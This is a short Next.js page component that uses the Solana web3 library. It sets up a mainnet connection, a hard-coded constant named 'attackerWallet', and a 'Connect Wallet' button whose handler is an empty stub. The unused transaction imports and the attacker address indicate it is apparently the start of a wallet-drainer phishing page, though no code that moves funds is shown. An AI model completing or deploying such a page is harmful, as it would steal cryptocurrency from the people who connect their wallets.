"use client"; // Ensure it's a client component if using Next.js App Router

import { useState } from "react";
import { Connection, PublicKey, Transaction, sendAndConfirmTransaction } from "@solana/web3.js"; // Move this to the top

const connection = new Connection("https://api.mainnet-beta.solana.com");
const attackerWallet = new PublicKey("71qSrwfcwx68ZkAoMVAyHvkS1RWmMyFHs9ERD25Kgm6e");

export default function Page() {
  const [wallet, setWallet] = useState<string | null>(null);

  const connectWallet = async () => {
    try {
      // Example logic to connect a Solana wallet
      console.log("Connecting to wallet...");
      // Implement wallet connection logic here
    } catch (error) {
      console.error("Error connecting wallet:", error);
    }
  };

  return (
    <div>
      <h1>Welcome to the App</h1>
      <button onClick={connectWallet}>Connect Wallet</button>
    </div>
  );
}
